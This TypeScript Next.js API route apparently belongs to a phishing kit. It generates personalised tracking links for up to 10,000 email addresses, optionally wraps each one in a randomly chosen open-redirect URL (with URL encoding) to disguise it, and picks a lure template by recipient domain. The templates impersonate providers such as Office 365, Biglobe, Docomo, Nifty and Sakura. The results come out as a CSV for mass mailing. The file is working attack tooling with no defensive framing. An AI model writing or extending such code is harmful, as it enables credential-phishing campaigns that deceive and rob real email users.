import { NextRequest, NextResponse } from 'next/server'
import { createPersonalizedLink } from '@/lib/linkManagement'

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const {
      emailList,      // Array of emails
      redirectList,   // Array of redirect URLs (optional)
      useOpenRedirect,
      encodeUrl,
      template,       // 'auto-detect' or template ID
      loadingScreen,
      duration,
      expirationHours = 24
    } = body


    // Validation
    if (!emailList || !Array.isArray(emailList) || emailList.length === 0) {
      return NextResponse.json({ error: 'Email list required' }, { status: 400 })
    }

    if (emailList.length > 10000) {
      return NextResponse.json({ error: 'Maximum 10,000 emails allowed' }, { status: 400 })
    }

    // Get base URL
    const baseUrl = process.env.NEXT_PUBLIC_BASE_URL || 
                   process.env.BASE_URL || 
                   `${request.nextUrl.protocol}//${request.headers.get('host') || 'localhost:3000'}`

    // Generate links for each email
    const links: Array<{ email: string; link: string }> = []
    const errors: Array<{ email: string; error: string }> = []

    for (let i = 0; i < emailList.length; i++) {
      const email = emailList[i].trim()
      if (!email || !email.includes('@')) {
        continue
      }

      try {
        // Determine template for this email
        let emailTemplate = template
        if (template === 'auto-detect') {
          emailTemplate = detectTemplateFromEmail(email)
        }


        // Create personalized link
        const result = await createPersonalizedLink(
          email,
          undefined,
          expirationHours,
          emailTemplate,
          template === 'auto-detect' ? 'auto' : 'manual',
          loadingScreen,
          duration
        )

        // Build base link
        let finalLink = `${baseUrl}${result.url}`

        // Wrap in open redirect if requested
        if (useOpenRedirect && redirectList && redirectList.length > 0) {
          // Random selection of redirect
          const redirectUrl = redirectList[Math.floor(Math.random() * redirectList.length)].trim()
          
          if (encodeUrl) {
            // Encoded format
            finalLink = `${redirectUrl}${encodeURIComponent(finalLink)}`
          } else {
            // Plain format
            finalLink = `${redirectUrl}${finalLink}`
          }
        }

        links.push({ email, link: finalLink })
      } catch (error) {
        errors.push({ 
          email, 
          error: error instanceof Error ? error.message : 'Unknown error' 
        })
      }
    }

    // Generate CSV content
    const csvContent = generateCSV(links)

    if (errors.length > 0) {
    }

    return NextResponse.json({
      success: true,
      count: links.length,
      csv: csvContent,
      links,
      errors: errors.length > 0 ? errors : undefined
    })

  } catch (error) {
    return NextResponse.json(
      { 
        success: false,
        error: 'Failed to generate bulk links', 
        details: error instanceof Error ? error.message : 'Unknown error' 
      },
      { status: 500 }
    )
  }
}

// Helper: Detect template from email domain
function detectTemplateFromEmail(email: string): string {
  const domain = email.split('@')[1]?.toLowerCase()
  
  if (!domain) return 'office365'
  
  // Check domain patterns
  if (domain.includes('outlook.') || domain.includes('hotmail.') || domain.includes('live.') || domain.includes('office365.')) {
    return 'office365'
  }
  if (domain.includes('biglobe.')) return 'biglobe'
  if (domain.includes('docomo.')) return 'docomo'
  if (domain.includes('nifty.')) return 'nifty'
  if (domain.includes('sakura.')) return 'sakura'
  
  // Check for Gmail/Google (but still use office365 template)
  if (domain.includes('gmail.') || domain.includes('googlemail.')) {
    return 'office365'
  }
  
  // TODO: Check MX records for more accurate detection
  // For now, default to office365 as the most universal template
  return 'office365'
}

// Helper: Generate CSV from links
function generateCSV(links: Array<{ email: string; link: string }>): string {
  let csv = 'Email,Link\n'
  
  for (const { email, link } of links) {
    // Escape commas and quotes in email/link
    const escapedEmail = email.includes(',') || email.includes('"') 
      ? `"${email.replace(/"/g, '""')}"` 
      : email
    const escapedLink = link.includes(',') || link.includes('"')
      ? `"${link.replace(/"/g, '""')}"`
      : link
    csv += `${escapedEmail},${escapedLink}\n`
  }
  
  return csv
}
